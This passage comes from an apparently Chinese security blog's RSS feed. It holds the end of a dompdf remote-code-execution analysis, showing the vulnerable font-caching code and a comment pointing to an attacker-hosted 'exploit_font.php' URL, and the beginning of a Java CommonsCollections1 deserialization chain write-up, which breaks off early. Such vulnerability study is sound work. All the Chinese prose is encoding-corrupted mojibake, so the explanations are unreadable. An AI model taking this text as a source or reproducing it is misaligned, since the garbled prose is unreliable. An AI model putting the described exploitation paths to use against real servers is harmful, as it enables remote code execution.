class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//normalå†…å®¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$fontDir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFontDir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$remoteHash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$remoteFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//è¿™é‡Œå°±æ˜¯æ–‡ä»¶åçš„md5ï¼ŒåŠ å¯†çš„å†…å®¹ä¸ºhttp://127.0.0.1:9001/exploit_font.php
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$prefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fontname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;_&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$styleString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$prefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;W]&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;_&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prefix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$prefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/[^-_&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;w]+/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prefix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$localFile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$fontDir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;_&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$remoteHash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$localFile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pathinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;parse_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$remoteFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PHP_URL_PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PATHINFO_EXTENSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//è¿™é‡Œå°±æ˜¯æ¼æ´ç‚¹äº†ï¼Œè§£æurlç„¶åæŠŠurlé‡Œé¢çš„åç¼€åå½“ä½œç¼“å­˜çš„åç¼€åå¯¼è‡´äº†æ¼æ´äº§ç”Ÿ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;c1&#34;&gt;// Download the remote file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;k&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$remoteFileContent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$http_response_header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Helpers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFileContent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$remoteFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$localTempFile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tempnam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tempDir&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;dompdf-font-&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$localTempFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$remoteFileContent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$font&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;load&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$localTempFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$font&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$localTempFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;parse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$localTempFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;c1&#34;&gt;// Save the changes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$localFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$remoteFileContent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;saveFontFamilies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éƒ¨åˆ†è§£é‡Šå·²ç»åœ¨ä»£ç ä¸­æœ‰å¤‡æ³¨ï¼Œåé¢å°±æ˜¯*&lt;code&gt;file_put_contents*($localFile, $remoteFileContent)ï¼Œ&lt;/code&gt;ä¿å­˜æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥å¼€phpstormçš„xdebugè¿›è¡Œè°ƒè¯•ï¼ŒæŸ¥çœ‹æ•´ä¸ªæ¼æ´çš„åˆ©ç”¨é“¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dompdf/Untitled%204.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹å°±æ˜¯å› ä¸º&lt;code&gt;$dompdf-&amp;gt;render()&lt;/code&gt; çš„æ¸²æŸ“ï¼Œç„¶ååˆ°åŠ è½½&lt;code&gt;$this-&amp;gt;css-&amp;gt;load_css_file&lt;/code&gt; cssæ–‡ä»¶ï¼Œæ‰è§¦å‘äº†æ¼æ´ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x02-æ€»ç»“&#34;&gt;0x02 æ€»ç»“&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªæ¼æ´å…¶å®åˆ©ç”¨ä¸Šä¸éš¾ï¼Œå°±æ˜¯çœ‹æ€ä¹ˆå»å‘ç°ï¼Œä¸»è¦è¿˜æ˜¯ä»file_put_contentså‡½æ•°å»å¯»æ‰¾å¯åˆ©ç”¨çš„ç‚¹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x03-å‚è€ƒ&#34;&gt;0x03 å‚è€ƒ&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://positive.security/blog/dompdf-rce&#34;&gt;https://positive.security/blog/dompdf-rce&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Javaä»£ç å®¡è®¡-CommonsCollections1é“¾åˆ†æ</title>
      <link>https://xxe.icu/commonscollections1_chain_analysis.html</link>
      <pubDate>Tue, 22 Nov 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/commonscollections1_chain_analysis.html</guid>
      
        <description>&lt;h2 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h2&gt;
&lt;p&gt;æœ¬æ–‡æ‰€è®²è¿°çš„CommonsCollections1é“¾ä¹Ÿè¢«ç§°ä¸ºCC1é“¾ï¼Œå®ƒæ˜¯å±äºApache Commons Collectionsæ˜¯Javaä¸­åº”ç”¨å¹¿æ³›çš„ä¸€ä¸ªåº“ï¼ŒApache Commons Collectionsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚å…¶ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼Œ&lt;a href=&#34;http://commons.apache.org/proper/commons-collections/&#34;&gt;Commons Collections&lt;/a&gt;åŒ…ä¸ºJavaæ ‡å‡†çš„Collections APIæä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ï¼Œè®©åº”ç”¨ç¨‹åºåœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæ—¢ä¿è¯äº†æ€§èƒ½ï¼Œä¹Ÿèƒ½å¤§å¤§ç®€åŒ–ä»£ç ï¼Œæ•…è€Œè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚&lt;/p&gt;
&lt;p&gt;å°½ç®¡å®ƒçš„åˆè¡·æ˜¯å¥½çš„ï¼Œä½†å…¶ä¸­æœ‰ä¸€äº›ä»£ç ä¸ä¸¥è°¨ï¼Œå¯¼è‡´å¾ˆå¤šå¼•ç”¨äº†è¿™ä¸ªåº“çš„Javaåº”ç”¨ç¨‹åº(å¦‚WebLogicã€Websphereã€Jbossã€Jenkinç­‰)ä¼šäº§ç”ŸRCEæ¼æ´ã€‚Apache Commons Collectionsçš„æ¼æ´æœ€åˆåœ¨2015å¹´11æœˆ6æ—¥ç”±FoxGlove Securityå®‰å…¨å›¢é˜Ÿçš„&lt;a href=&#34;https://github.com/breenmachine&#34;&gt;@breenmachine&lt;/a&gt; åœ¨ä¸€ç¯‡é•¿åšå®¢ä¸Šé˜è¿°ï¼Œå±å®³é¢è¦†ç›–äº†å¤§éƒ¨åˆ†çš„Webä¸­é—´ä»¶ï¼Œå½±å“ååˆ†æ·±è¿œï¼Œæ¨ªæ‰«äº†WebLogicã€WebSphereã€JBossã€Jenkinsã€OpenNMSçš„æœ€æ–°ç‰ˆã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç¯å¢ƒå‡†å¤‡&#34;&gt;ç¯å¢ƒå‡†å¤‡&lt;/h3&gt;
&lt;p&gt;è°ƒè¯•å·¥å…·ï¼šIDEA&lt;/p&gt;
&lt;p&gt;Javaç‰ˆæœ¬ï¼š8u65ï¼Œä¸‹è½½åœ°å€ï¼šhttps://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html&lt;/p&gt;
&lt;p&gt;8u65æºç ï¼šä¸‹è½½åœ°å€ï¼šhttps://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip&lt;/p&gt;
&lt;p&gt;pomæ–‡ä»¶é…ç½®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nt&#34;&gt;&amp;lt;dependencies&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&#34;nt&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&#34;nt&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;3.2.1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/dependencies&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å·¥å…·å®‰è£…ã€Javaç‰ˆæœ¬é…ç½®ã€æºç åŠ è½½è¿™äº›å»ºè®®ä»ç½‘ä¸Šè¡¥ä¸€ä¸‹è¿™æ–¹é¢çš„çŸ¥è¯†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0x01-åŸºç¡€&#34;&gt;0x01 åŸºç¡€&lt;/h2&gt;
&lt;h3 id=&#34;åå°„æœºåˆ¶&#34;&gt;åå°„æœºåˆ¶&lt;/h3&gt;
&lt;p&gt;ä¸€å¼€å§‹çœ‹åˆ°åå°„å°±è”æƒ³åˆ°åå¼¹shellä¸€ç±»çš„å†…å®¹ï¼Œå…¶å®ä¸é‚£äº›å¹¶æ— å¹²ç³»ï¼Œåå°„æœºåˆ¶æ˜¯Javaçš„ä¸€ç§ç‰¹æ€§ï¼Œå¯ä»¥ç†è§£ä¸ºåœ¨è¿è¡Œä¸­ï¼ˆè€Œéç¼–è¯‘æœŸé—´ï¼‰è·å–å¯¹è±¡ç±»å‹ä¿¡æ¯çš„æ“ä½œã€‚ä¼ ç»Ÿçš„ç¼–ç¨‹æ–¹æ³•è¦æ±‚ç¨‹åºå‘˜åœ¨ç¼–è¯‘é˜¶æ®µå†³å®šä½¿ç”¨çš„ç±»å‹ï¼Œä½†æ˜¯åœ¨åå°„çš„å¸®åŠ©ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åŠ¨æ€è·å–è¿™äº›ä¿¡æ¯ï¼Œä»è€Œç¼–å†™æ›´åŠ å…·æœ‰å¯ç§»æ¤æ€§çš„ä»£ç ã€‚å½“ç„¶ï¼Œåå°„å¹¶éæŸç§ç¼–ç¨‹è¯­è¨€çš„ç‰¹æ€§ï¼Œç†è®ºä¸Šä½¿ç”¨ä»»ä½•ä¸€ç§è¯­è¨€éƒ½å¯ä»¥å®ç°åå°„æœºåˆ¶ï¼Œä½†æ˜¯åƒJavaè¯­è¨€æœ¬èº«æ”¯æŒåå°„ï¼Œé‚£åå°„çš„å®ç°å°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚&lt;/p&gt;
&lt;p&gt;æ ¹æ®ç½‘ä¸Šçš„èµ„æ–™ï¼ŒJAVAåå°„æœºåˆ¶çš„åŠŸèƒ½å¯ä»¥ç”¨å¦‚ä¸‹å‡ å¥è¯ç®€è¦æè¿°ï¼š
åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œåˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ï¼›
åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œæ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼›
åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œè·å–æˆ–ä¿®æ”¹ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼›
åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œè°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼›
å¦å¤–è¿˜å¯ç”ŸæˆåŠ¨æ€ä»£ç†å’Œè·å–ç±»çš„å…¶ä»–ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çŸ¥é“åœ¨Javaä¸­ä¸€åˆ‡éƒ½æ˜¯å¯¹è±¡ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ‰€ä½¿ç”¨çš„å¯¹è±¡éƒ½ç›´æ¥æˆ–é—´æ¥ç»§æ‰¿è‡ªObjectç±»ã€‚Objectç±»ä¸­åŒ…å«ä¸€ä¸ªæ–¹æ³•åå«getClassï¼Œåˆ©ç”¨è¿™ä¸ªæ–¹æ³•å°±å¯ä»¥è·å¾—ä¸€ä¸ªå®ä¾‹çš„ç±»å‹ç±»ã€‚
éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåå°„æœºåˆ¶åœ¨è¿è¡Œæ—¶åªèƒ½è°ƒç”¨methodsæˆ–æ”¹å˜fieldså†…å®¹ï¼Œå´æ— æ³•ä¿®æ”¹ç¨‹åºç»“æ„æˆ–å˜é‡ç±»å‹ã€‚&lt;/p&gt;
&lt;h3 id=&#34;java-runtimeç±»&#34;&gt;Java Runtimeç±»&lt;/h3&gt;
